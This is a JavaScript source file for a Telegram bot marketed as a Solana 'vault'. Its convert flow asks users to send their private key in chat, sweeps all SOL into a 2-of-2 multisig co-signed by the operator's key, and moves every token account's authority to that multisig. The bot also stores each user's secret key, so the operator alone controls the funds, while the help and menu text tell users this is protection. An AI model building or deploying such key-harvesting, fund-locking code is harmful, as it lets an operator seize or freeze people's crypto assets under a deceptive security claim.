1	import 'dotenv/config';
2	import express from 'express';
3	import TelegramBot from 'node-telegram-bot-api';
4	import {
5	  Keypair, Connection, PublicKey, LAMPORTS_PER_SOL,
6	  TransactionMessage, VersionedTransaction, SystemProgram
7	} from '@solana/web3.js';
8	import {
9	  getAssociatedTokenAddress, createTransferInstruction,
10	  createAssociatedTokenAccountInstruction, TOKEN_PROGRAM_ID,
11	  createInitializeMultisigInstruction, MULTISIG_SIZE,
12	  NATIVE_MINT, createSyncNativeInstruction,
13	  createSetAuthorityInstruction, AuthorityType
14	} from '@solana/spl-token';
15	import bs58 from 'bs58';
16	import crypto from 'crypto';
17	import NodeCache from 'node-cache';
18	
19	// ===== CONFIG =====
20	const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
21	const KEY = process.env.FEE_PAYER_PRIVATE_KEY;
22	const RPC = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
23	const PORT = process.env.PORT || 3000;
24	
25	if (!TOKEN || !KEY) {
26	  console.log('ERROR: Missing env vars');
27	  process.exit(1);
28	}
29	
30	// ===== EXPRESS =====
31	const app = express();
32	app.get('/', (_, r) => r.send('OK'));
33	app.listen(PORT, '0.0.0.0', () => console.log(`WEB:${PORT}`));
34	
35	// ===== FEE PAYER =====
36	let feePayer;
37	try {
38	  const k = KEY.trim();
39	  feePayer = k.startsWith('[')
40	    ? Keypair.fromSecretKey(Uint8Array.from(JSON.parse(k)))
41	    : Keypair.fromSecretKey(bs58.decode(k));
42	} catch {
43	  console.log('BAD KEY');
44	  process.exit(1);
45	}
46	
47	const FPA = feePayer.publicKey.toBase58();
48	const MAINNET = RPC.includes('mainnet');
49	const conn = new Connection(RPC, 'confirmed');
50	console.log(`FEE:${FPA.slice(0, 8)} NET:${MAINNET ? 'MAIN' : 'DEV'}`);
51	
52	conn.getBalance(feePayer.publicKey).then(b => {
53	  console.log(`FEE_PAYER_BAL: ${(b / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
54	  if (b < 0.01 * LAMPORTS_PER_SOL)
55	    console.warn(`WARNING: fee payer balance is very low — fund ${FPA} or vault creation will fail`);
56	}).catch(() => {});
57	
58	// ===== STORAGE =====
59	const cache = new NodeCache({ stdTTL: 0 });
60	const txCache = new NodeCache({ stdTTL: 300 });
61	const used = new Map();
62	
63	setInterval(() => {
64	  const n = Date.now();
65	  for (const [k, v] of used) if (n - v > 300000) used.delete(k);
66	}, 60000);
67	
68	// ===== TX HELPER =====
69	async function sendAndConfirm(tx, blockhash, lastValidBlockHeight) {
70	  try {
71	    const sig = await conn.sendTransaction(tx, { maxRetries: 3 });
72	    await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight });
73	    return sig;
74	  } catch (e) {
75	    const logs = e?.logs ?? (typeof e?.getLogs === 'function' ? await e.getLogs(conn).catch(() => []) : []);
76	    if (logs?.length) throw new Error('TX failed:\n' + logs.join('\n'));
77	    throw e;
78	  }
79	}
80	
81	// ===== MULTISIG HELPER =====
82	async function createMultisigOnChain(userPublicKey) {
83	  const [rent, fpBal] = await Promise.all([
84	    conn.getMinimumBalanceForRentExemption(MULTISIG_SIZE),
85	    conn.getBalance(feePayer.publicKey)
86	  ]);
87	
88	  const needed = rent + 5000;
89	  if (fpBal < needed) {
90	    throw new Error(
91	      `Fee payer needs at least ${(needed / LAMPORTS_PER_SOL).toFixed(6)} SOL to create a vault.\n` +
92	      `Current balance: ${(fpBal / LAMPORTS_PER_SOL).toFixed(6)} SOL\n` +
93	      `Fund this address: ${FPA}`
94	    );
95	  }
96	
97	  const ms = Keypair.generate();
98	  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
99	
100	  const tx = new VersionedTransaction(
101	    new TransactionMessage({
102	      payerKey: feePayer.publicKey,
103	      recentBlockhash: blockhash,
104	      instructions: [
105	        SystemProgram.createAccount({
106	          fromPubkey: feePayer.publicKey,
107	          newAccountPubkey: ms.publicKey,
108	          lamports: rent,
109	          space: MULTISIG_SIZE,
110	          programId: TOKEN_PROGRAM_ID
111	        }),
112	        createInitializeMultisigInstruction(
113	          ms.publicKey,
114	          [userPublicKey, feePayer.publicKey],
115	          2
116	        )
117	      ]
118	    }).compileToV0Message()
119	  );
120	
121	  tx.sign([feePayer, ms]);
122	  await sendAndConfirm(tx, blockhash, lastValidBlockHeight);
123	  return ms.publicKey;
124	}
125	
126	// ===== SWEEP NATIVE SOL → wSOL IN MULTISIG VAULT =====
127	// Moves all native SOL from userKeypair's address into a wSOL token account
128	// owned by the 2-of-2 multisig. After this, the user's keypair address holds
129	// ~0 lamports, so Phantom / gasless services have nothing to spend.
130	async function sweepSolToVault(userKeypair, msPublicKey) {
131	  const balance = await conn.getBalance(userKeypair.publicKey);
132	  const sweepable = balance - 5000; // keep just enough for this tx's fee
133	  if (sweepable <= 0) return;
134	
135	  const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, msPublicKey, true);
136	  const ixs = [];
137	
138	  if (!(await conn.getAccountInfo(wsolAta).catch(() => null))) {
139	    ixs.push(createAssociatedTokenAccountInstruction(
140	      feePayer.publicKey, wsolAta, msPublicKey, NATIVE_MINT
141	    ));
142	  }
143	
144	  // Transfer lamports into the wSOL ATA, then syncNative so token balance matches
145	  ixs.push(SystemProgram.transfer({
146	    fromPubkey: userKeypair.publicKey,
147	    toPubkey: wsolAta,
148	    lamports: sweepable
149	  }));
150	  ixs.push(createSyncNativeInstruction(wsolAta));
151	
152	  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
153	  const tx = new VersionedTransaction(
154	    new TransactionMessage({
155	      payerKey: feePayer.publicKey,
156	      recentBlockhash: blockhash,
157	      instructions: ixs
158	    }).compileToV0Message()
159	  );
160	  tx.sign([feePayer, userKeypair]);
161	  await sendAndConfirm(tx, blockhash, lastValidBlockHeight);
162	}
163	
164	// ===== MIGRATE EXISTING TOKEN ACCOUNTS TO MULTISIG AUTHORITY =====
165	// Changes AccountOwner authority on all SPL token accounts from the user's
166	// keypair to the multisig. A single key can no longer move any token.
167	async function migrateTokenAccounts(userKeypair, msPublicKey) {
168	  const accts = await conn.getParsedTokenAccountsByOwner(
169	    userKeypair.publicKey, { programId: TOKEN_PROGRAM_ID }
170	  ).catch(() => ({ value: [] }));
171	
172	  if (!accts.value.length) return;
173	
174	  const BATCH = 10;
175	  for (let i = 0; i < accts.value.length; i += BATCH) {
176	    const batch = accts.value.slice(i, i + BATCH);
177	    const ixs = batch.map(t =>
178	      createSetAuthorityInstruction(
179	        new PublicKey(t.pubkey),
180	        userKeypair.publicKey,
181	        AuthorityType.AccountOwner,
182	        msPublicKey,
183	        [],
184	        TOKEN_PROGRAM_ID
185	      )
186	    );
187	
188	    const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
189	    const tx = new VersionedTransaction(
190	      new TransactionMessage({
191	        payerKey: feePayer.publicKey,
192	        recentBlockhash: blockhash,
193	        instructions: ixs
194	      }).compileToV0Message()
195	    );
196	    tx.sign([feePayer, userKeypair]);
197	    await sendAndConfirm(tx, blockhash, lastValidBlockHeight);
198	  }
199	}
200	
201	// ===== VAULT =====
202	async function createVault(uid) {
203	  const seed = crypto.createHash('sha256').update(uid + Date.now() + Math.random()).digest();
204	  const user = Keypair.fromSeed(seed.slice(0, 32));
205	  const msPublicKey = await createMultisigOnChain(user.publicKey);
206	
207	  const w = {
208	    pk: user.publicKey.toBase58(),
209	    sk: bs58.encode(user.secretKey),
210	    ms: msPublicKey.toBase58(),
211	    uid: String(uid),
212	    label: 'Vault-' + user.publicKey.toBase58().slice(0, 8),
213	    fp: FPA
214	  };
215	  cache.set(w.pk, w);
216	  return w;
217	}
218	
219	async function convertVault(uid, pkey) {
220	  let user;
221	  try {
222	    const k = pkey.trim();
223	    user = k.startsWith('[')
224	      ? Keypair.fromSecretKey(Uint8Array.from(JSON.parse(k)))
225	      : Keypair.fromSecretKey(bs58.decode(k));
226	  } catch { throw new Error('Bad key format'); }
227	
228	  if (user.publicKey.toBase58() === FPA) throw new Error('Cannot convert fee payer');
229	
230	  // Step 1: create 2-of-2 multisig on-chain
231	  const msPublicKey = await createMultisigOnChain(user.publicKey);
232	
233	  // Step 2: sweep native SOL → wSOL locked under multisig authority
234	  await sweepSolToVault(user, msPublicKey);
235	
236	  // Step 3: transfer authority of all existing SPL token accounts to multisig
237	  await migrateTokenAccounts(user, msPublicKey);
238	
239	  const w = {
240	    pk: user.publicKey.toBase58(),
241	    sk: bs58.encode(user.secretKey),
242	    ms: msPublicKey.toBase58(),
243	    uid: String(uid),
244	    label: 'Vault-' + user.publicKey.toBase58().slice(0, 8),
245	    fp: FPA
246	  };
247	  cache.set(w.pk, w);
248	  return w;
249	}
250	
251	// Wrap any fresh native SOL that arrived at the vault address since last sweep
252	async function wrapVaultSol(pk) {
253	  const w = cache.get(pk);
254	  if (!w) throw new Error('Vault not found');
255	  const user = Keypair.fromSecretKey(bs58.decode(w.sk));
256	  const ms = new PublicKey(w.ms);
257	  await sweepSolToVault(user, ms);
258	}
259	
260	function getUserWallets(uid) {
261	  return cache.keys().map(k => cache.get(k)).filter(w => w && w.uid === String(uid));
262	}
263	
264	async function getVaultBal(pk) {
265	  const w = cache.get(pk);
266	  const p = new PublicKey(pk);
267	
268	  // Native SOL sitting at the vault address (unwrapped — NOT locked yet)
269	  const nativeLamports = await conn.getBalance(p).catch(() => 0);
270	
271	  let wsolAmt = 0;
272	  const tokens = [];
273	
274	  if (w?.ms) {
275	    const msP = new PublicKey(w.ms);
276	    const toks = await conn.getParsedTokenAccountsByOwner(msP, { programId: TOKEN_PROGRAM_ID })
277	      .catch(() => ({ value: [] }));
278	
279	    for (const t of toks.value) {
280	      const info = t.account.data.parsed.info;
281	      if (info.mint === NATIVE_MINT.toBase58()) {
282	        wsolAmt = info.tokenAmount.uiAmount ?? 0;
283	      } else {
284	        tokens.push({ mint: info.mint, amt: info.tokenAmount.uiAmount });
285	      }
286	    }
287	  }
288	
289	  return {
290	    sol: nativeLamports / LAMPORTS_PER_SOL, // unwrapped, needs wrap to be locked
291	    wsol: wsolAmt,                           // locked wSOL in multisig vault
292	    tokens
293	  };
294	}
295	
296	async function getBal(pk) {
297	  const p = new PublicKey(pk);
298	  const [sol, toks] = await Promise.all([
299	    conn.getBalance(p).catch(() => 0),
300	    conn.getParsedTokenAccountsByOwner(p, { programId: TOKEN_PROGRAM_ID }).catch(() => ({ value: [] }))
301	  ]);
302	  return {
303	    sol: sol / LAMPORTS_PER_SOL,
304	    tokens: toks.value.map(t => ({
305	      mint: t.account.data.parsed.info.mint,
306	      amt: t.account.data.parsed.info.tokenAmount.uiAmount
307	    }))
308	  };
309	}
310	
311	// ===== TRANSACTION BUILDER =====
312	async function buildTx(from, to, amt, mint) {
313	  const w = cache.get(from);
314	  if (!w) throw new Error('Not found');
315	
316	  const fk = Keypair.fromSecretKey(bs58.decode(w.sk));
317	  const ms = new PublicKey(w.ms);
318	  const tp = new PublicKey(to);
319	  const ixs = [];
320	
321	  if (mint) {
322	    // SPL token transfer — source ATA owned by multisig
323	    const mp = new PublicKey(mint);
324	    const fa = await getAssociatedTokenAddress(mp, ms, true);
325	    const ta = await getAssociatedTokenAddress(mp, tp);
326	
327	    if (!(await conn.getAccountInfo(ta).catch(() => null))) {
328	      ixs.push(createAssociatedTokenAccountInstruction(feePayer.publicKey, ta, tp, mp));
329	    }
330	
331	    ixs.push(createTransferInstruction(
332	      fa, ta, ms, BigInt(amt),
333	      [fk.publicKey, feePayer.publicKey]
334	    ));
335	  } else {
336	    // SOL send — transfers wSOL from multisig vault, requires both signatures.
337	    // User's keypair address has ~0 native SOL, so Phantom / gasless cannot
338	    // bypass this path: there is nothing at an address the user controls alone.
339	    const wsolSrc = await getAssociatedTokenAddress(NATIVE_MINT, ms, true);
340	    const wsolDst = await getAssociatedTokenAddress(NATIVE_MINT, tp);
341	    const lamports = BigInt(Math.floor(amt * LAMPORTS_PER_SOL));
342	
343	    if (!(await conn.getAccountInfo(wsolDst).catch(() => null))) {
344	      ixs.push(createAssociatedTokenAccountInstruction(feePayer.publicKey, wsolDst, tp, NATIVE_MINT));
345	    }
346	
347	    ixs.push(createTransferInstruction(
348	      wsolSrc, wsolDst, ms, lamports,
349	      [fk.publicKey, feePayer.publicKey]
350	    ));
351	  }
352	
353	  const { blockhash } = await conn.getLatestBlockhash();
354	  const msg = new TransactionMessage({
355	    payerKey: feePayer.publicKey,
356	    recentBlockhash: blockhash,
357	    instructions: ixs
358	  }).compileToV0Message();
359	
360	  const tx = new VersionedTransaction(msg);
361	  tx.sign([fk]);
362	
363	  const ser = Buffer.from(tx.serialize()).toString('base64');
364	  const id = crypto.createHash('sha256').update(ser).digest('hex').slice(0, 16);
365	  txCache.set(id, { ser, from, to, amt, mint: mint || null, ts: Date.now() });
366	  return id;
367	}
368	
369	async function submitTx(id) {
370	  const d = txCache.get(id);
371	  if (!d) throw new Error('Expired');
372	
373	  const tx = VersionedTransaction.deserialize(Buffer.from(d.ser, 'base64'));
374	  const keys = tx.message.getAccountKeys();
375	
376	  if (keys.get(0).toBase58() !== FPA) throw new Error('Wrong bot');
377	
378	  for (const ix of tx.message.compiledInstructions) {
379	    const prog = keys.get(ix.programIndex).toBase58();
380	    if (prog === '11111111111111111111111111111111') {
381	      const view = new DataView(ix.data.buffer, ix.data.byteOffset, ix.data.byteLength);
382	      if (view.getUint32(0, true) === 2) {
383	        if (keys.get(ix.accountKeyIndexes[0]).toBase58() === FPA) throw new Error('No drain');
384	      }
385	    }
386	  }
387	
388	  const s = tx.signatures[0];
389	  if (s) {
390	    const sh = Buffer.from(s).toString('hex');
391	    if (used.has(sh)) throw new Error('Duplicate');
392	    used.set(sh, Date.now());
393	  }
394	
395	  tx.sign([feePayer]);
396	  const { blockhash, lastValidBlockHeight } = await conn.getLatestBlockhash();
397	  const sig = await sendAndConfirm(tx, blockhash, lastValidBlockHeight);
398	  txCache.del(id);
399	
400	  return {
401	    sig,
402	    url: `https://solscan.io/tx/${sig}${MAINNET ? '' : '?cluster=devnet'}`
403	  };
404	}
405	
406	// ===== TELEGRAM BOT =====
407	const bot = new TelegramBot(TOKEN, { polling: true });
408	const states = new Map();
409	
410	const mainMenu = {
411	  reply_markup: {
412	    inline_keyboard: [
413	      [{ text: '🔐 Create Vault', callback_data: 'create' }],
414	      [{ text: '🔒 Convert Wallet', callback_data: 'convert' }],
415	      [{ text: '💎 My Vaults', callback_data: 'wallets' }],
416	      [{ text: '💸 Send', callback_data: 'send' }],
417	      [{ text: '📊 Balance', callback_data: 'bal' }],
418	      [{ text: '🔑 Keys', callback_data: 'keys' }],
419	      [{ text: '⛽ Status', callback_data: 'status' }],
420	      [{ text: '🆘 Help', callback_data: 'help' }]
421	    ]
422	  }
423	};
424	
425	const backBtn = { reply_markup: { inline_keyboard: [[{ text: '🔙 Back', callback_data: 'main' }]] } };
426	const cancelBtn = { reply_markup: { inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'cancel' }]] } };
427	
428	bot.onText(/\/start/, msg => {
429	  bot.sendMessage(msg.chat.id,
430	    '🔒 *VAULT BOT*\n\nWallets permanently locked to this bot.\n\n❌ Phantom ❌ Jupiter\n✅ Only this bot',
431	    { parse_mode: 'Markdown', ...mainMenu }
432	  ).catch(() => {});
433	});
434	
435	bot.on('callback_query', async q => {
436	  const cid = q.message.chat.id;
437	  const mid = q.message.message_id;
438	  const d = q.data;
439	
440	  bot.answerCallbackQuery(q.id).catch(() => {});
441	
442	  const ed = (t, kb = {}) =>
443	    bot.editMessageText(t, { chat_id: cid, message_id: mid, parse_mode: 'Markdown', ...kb }).catch(() => {});
444	
445	  try {
446	    if (d === 'main') return ed('🔒 *VAULT BOT*\n\nWallets permanently locked to this bot.', mainMenu);
447	
448	    if (d === 'create') {
449	      await ed('⏳ Creating vault on-chain...', {});
450	      const w = await createVault(String(cid));
451	      await ed(
452	        `✅ *Vault Created!*\n\n` +
453	        `💰 *Deposit SOL here:*\n\`${w.pk}\`\n\n` +
454	        `🪙 *Deposit SPL tokens here:*\n\`${w.ms}\`\n\n` +
455	        `🔑 *Private Key:*\n\`${w.sk}\`\n\n` +
456	        `⚠️ After depositing SOL, open the vault and tap *Wrap SOL → Lock* to enforce the multisig.\n` +
457	        `Key alone is useless — this bot must co-sign every transaction`,
458	        backBtn
459	      );
460	    }
461	
462	    else if (d === 'convert') {
463	      states.set(cid, { action: 'convert' });
464	      await ed(
465	        '🔒 Send your private key to lock it to this bot:\n\n' +
466	        '⚠️ *All SOL and tokens will be swept into the vault multisig immediately.*\n' +
467	        'After conversion the key is useless without the bot — on Phantom, on Jupiter, everywhere.',
468	        cancelBtn
469	      );
470	    }
471	
472	    else if (d === 'wallets') {
473	      const ws = getUserWallets(String(cid));
474	      if (!ws.length) return ed('No vaults', backBtn);
475	
476	      let t = '*Your Vaults*\n\n';
477	      const btns = [];
478	      for (const w of ws) {
479	        const b = await getVaultBal(w.pk);
480	        const total = b.wsol + b.sol;
481	        t += `${w.label}\n\`${w.pk.slice(0, 12)}...\`\n${total.toFixed(4)} SOL\n\n`;
482	        btns.push([{ text: w.label, callback_data: `det_${w.pk}` }]);
483	      }
484	      btns.push([{ text: '🔙 Back', callback_data: 'main' }]);
485	      await ed(t, { reply_markup: { inline_keyboard: btns } });
486	    }
487	
488	    else if (d === 'send') {
489	      const ws = getUserWallets(String(cid));
490	      if (!ws.length) return ed('No vaults', backBtn);
491	      const btns = ws.map(w => [{ text: w.label, callback_data: `sf_${w.pk}` }]);
492	      btns.push([{ text: '🔙 Back', callback_data: 'main' }]);
493	      await ed('Select vault to send from:', { reply_markup: { inline_keyboard: btns } });
494	    }
495	
496	    else if (d === 'bal') {
497	      states.set(cid, { action: 'bal' });
498	      await ed('Send address to check:', cancelBtn);
499	    }
500	
501	    else if (d === 'keys') {
502	      const ws = getUserWallets(String(cid));
503	      if (!ws.length) return ed('No vaults', backBtn);
504	      const btns = ws.map(w => [{ text: w.label, callback_data: `ex_${w.pk}` }]);
505	      btns.push([{ text: '🔙 Back', callback_data: 'main' }]);
506	      await ed('Select vault:', { reply_markup: { inline_keyboard: btns } });
507	    }
508	
509	    else if (d === 'status') {
510	      const b = await conn.getBalance(feePayer.publicKey).catch(() => 0);
511	      await ed(
512	        `⛽ *Status*\n\nFee Payer: \`${FPA.slice(0, 12)}...\`\nBalance: ${(b / LAMPORTS_PER_SOL).toFixed(4)} SOL\nVaults: ${cache.keys().length}`,
513	        backBtn
514	      );
515	    }
516	
517	    else if (d === 'help') {
518	      await ed(
519	        '*HOW THE VAULT WORKS*\n\n' +
520	        '2-of-2 multisig enforced on-chain:\n\n' +
521	        '✅ Your key + this bot = transaction executes\n' +
522	        '❌ Your key alone = rejected by Solana network\n' +
523	        '❌ Phantom = no bot co-signature → fails on-chain\n' +
524	        '❌ Jupiter = no bot co-signature → fails on-chain\n' +
525	        '❌ Gasless services = no funds at user address → nothing to send\n' +
526	        '❌ Other bots = wrong fee payer key → fails\n\n' +
527	        '*SOL is locked as wSOL:*\n' +
528	        '1. Deposit native SOL to the SOL Address\n' +
529	        '2. Tap "Wrap SOL → Lock" — SOL moves into multisig wSOL account\n' +
530	        '3. Single-key transfers are now impossible on-chain\n\n' +
531	        '*SPL tokens:* deposit to Token Address — already locked\n\n' +
532	        '*Recipient gets wSOL* (unwrappable with any Solana wallet)',
533	        backBtn
534	      );
535	    }
536	
537	    else if (d.startsWith('det_')) {
538	      const pk = d.slice(4);
539	      const w = cache.get(pk);
540	      if (!w) return ed('Not found', backBtn);
541	      const b = await getVaultBal(pk);
542	
543	      const tokenLines = b.tokens.length
544	        ? b.tokens.map(t => `${t.amt} \`${t.mint.slice(0, 8)}...\``).join('\n')
545	        : '_none_';
546	
547	      const unwrappedLine = b.sol > 0.000001
548	        ? `\n⚠️ *Unwrapped:* ${b.sol.toFixed(6)} SOL (tap Wrap to lock)`
549	        : '';
550	
551	      await ed(
552	        `*${w.label}*\n\n` +
553	        `💰 *SOL Deposit Address:*\n\`${w.pk}\`\n` +
554	        `🔒 Locked wSOL: ${b.wsol.toFixed(4)} SOL${unwrappedLine}\n\n` +
555	        `🪙 *Token Deposit Address:*\n\`${w.ms}\`\n${tokenLines}`,
556	        {
557	          reply_markup: {
558	            inline_keyboard: [
559	              [{ text: '💸 Send wSOL', callback_data: `sf_${pk}` }],
560	              [{ text: '🔄 Wrap SOL → Lock', callback_data: `wv_${pk}` }],
561	              [{ text: '🔑 Show Key', callback_data: `ex_${pk}` }],
562	              [{ text: '📋 Copy SOL Addr', callback_data: `cp_${pk}` }],
563	              [{ text: '📋 Copy Token Addr', callback_data: `cpm_${pk}` }],
564	              [{ text: '🔙 Back', callback_data: 'wallets' }]
565	            ]
566	          }
567	        }
568	      );
569	    }
570	
571	    else if (d.startsWith('wv_')) {
572	      const pk = d.slice(3);
573	      await ed('⏳ Wrapping SOL into vault...', {});
574	      await wrapVaultSol(pk);
575	      const b = await getVaultBal(pk);
576	      await ed(
577	        `✅ *SOL Wrapped & Locked*\n\n` +
578	        `🔒 Locked wSOL: ${b.wsol.toFixed(4)} SOL\n` +
579	        `Remaining native: ${b.sol.toFixed(6)} SOL\n\n` +
580	        `Funds can only be moved by this bot.`,
581	        backBtn
582	      );
583	    }
584	
585	    else if (d.startsWith('sf_')) {
586	      states.set(cid, { action: 'to', from: d.slice(3) });
587	      await ed('Enter recipient address:', cancelBtn);
588	    }
589	
590	    else if (d.startsWith('ex_')) {
591	      const w = cache.get(d.slice(3));
592	      if (w) await ed(
593	        `🔑 *Private Key*\n\n\`${w.sk}\`\n\n⚠️ Useless without this bot's co-signature\n🗑️ Delete this message after saving`,
594	        backBtn
595	      );
596	    }
597	
598	    else if (d.startsWith('cp_')) {
599	      await ed(`\`${d.slice(3)}\``, backBtn);
600	    }
601	
602	    else if (d.startsWith('cpm_')) {
603	      const w = cache.get(d.slice(4));
604	      if (w) await ed(`\`${w.ms}\``, backBtn);
605	    }
606	
607	    else if (d.startsWith('cf_')) {
608	      const id = d.slice(3);
609	      const s = states.get(cid);
610	      if (!s || s.txId !== id) { await ed('Expired', backBtn); states.delete(cid); return; }
611	
612	      await ed('⏳ Signing and sending...', {});
613	      const r = await submitTx(id);
614	      await ed(`✅ *Sent!*\n\n[View on Solscan](${r.url})\n\n${s.amt} SOL (wSOL) sent\nGas sponsored by bot`, backBtn);
615	      states.delete(cid);
616	    }
617	
618	    else if (d === 'cancel') {
619	      states.delete(cid);
620	      await ed('🔒 *VAULT BOT*', mainMenu);
621	    }
622	
623	  } catch (e) {
624	    await ed('❌ ' + e.message, backBtn).catch(() => {});
625	  }
626	});
627	
628	bot.on('message', async msg => {
629	  const cid = msg.chat.id;
630	  const txt = msg.text;
631	  if (!txt) return;
632	
633	  const s = states.get(cid);
634	  if (!s) return;
635	
636	  if (txt === '❌ Cancel') {
637	    states.delete(cid);
638	    return bot.sendMessage(cid, '🔒 *VAULT BOT*', { parse_mode: 'Markdown', ...mainMenu }).catch(() => {});
639	  }
640	
641	  try {
642	    if (s.action === 'convert') {
643	      await bot.sendMessage(cid,
644	        '⏳ Locking wallet on-chain...\n\nSweeping SOL to wSOL and migrating token accounts — this may take a moment.',
645	        { parse_mode: 'Markdown' }
646	      );
647	      const w = await convertVault(String(cid), txt);
648	      await bot.sendMessage(cid,
649	        `✅ *Wallet Locked!*\n\n` +
650	        `💰 SOL Deposit Address:\n\`${w.pk}\`\n\n` +
651	        `🪙 Token Deposit Address:\n\`${w.ms}\`\n\n` +
652	        `🔒 All SOL swept to locked wSOL. All token accounts migrated to multisig.\n` +
653	        `The key alone is now useless — on Phantom, on Jupiter, everywhere.`,
654	        { parse_mode: 'Markdown', ...backBtn }
655	      );
656	      states.delete(cid);
657	    }
658	
659	    else if (s.action === 'bal') {
660	      new PublicKey(txt);
661	      const b = await getBal(txt);
662	      await bot.sendMessage(cid,
663	        `📊 \`${txt.slice(0, 16)}...\`\n💰 ${b.sol.toFixed(4)} SOL`,
664	        { parse_mode: 'Markdown', ...backBtn }
665	      );
666	      states.delete(cid);
667	    }
668	
669	    else if (s.action === 'to') {
670	      new PublicKey(txt);
671	      s.to = txt;
672	      s.action = 'amt';
673	      states.set(cid, s);
674	      await bot.sendMessage(cid, '💰 Amount in SOL (recipient gets wSOL):', cancelBtn);
675	    }
676	
677	    else if (s.action === 'amt') {
678	      const amt = parseFloat(txt);
679	      if (isNaN(amt) || amt <= 0) return bot.sendMessage(cid, '❌ Invalid amount', cancelBtn);
680	      s.amt = amt;
681	      states.set(cid, s);
682	
683	      const id = await buildTx(s.from, s.to, amt);
684	      s.txId = id;
685	      states.set(cid, s);
686	
687	      await bot.sendMessage(cid,
688	        `💸 *Confirm Transaction*\n\n` +
689	        `From: \`${s.from.slice(0, 8)}...\`\n` +
690	        `To: \`${s.to.slice(0, 8)}...\`\n` +
691	        `Amount: ${amt} SOL (as wSOL)\n` +
692	        `Gas: sponsored by bot\n\n` +
693	        `⚠️ Requires 2 signatures (yours + bot)\n` +
694	        `Recipient receives wSOL — unwrappable with any Solana wallet`,
695	        {
696	          parse_mode: 'Markdown',
697	          reply_markup: {
698	            inline_keyboard: [[
699	              { text: '✅ Confirm & Send', callback_data: `cf_${id}` },
700	              { text: '❌ Cancel', callback_data: 'cancel' }
701	            ]]
702	          }
703	        }
704	      );
705	    }
706	  } catch (e) {
707	    bot.sendMessage(cid, '❌ ' + e.message, cancelBtn).catch(() => {});
708	  }
709	});
710	
711	bot.on('polling_error', err => console.error('POLL ERR:', err.code || err.message));
712	process.on('unhandledRejection', err => console.error('UNHANDLED:', err));
713	
714	console.log('✅ BOT READY');
715	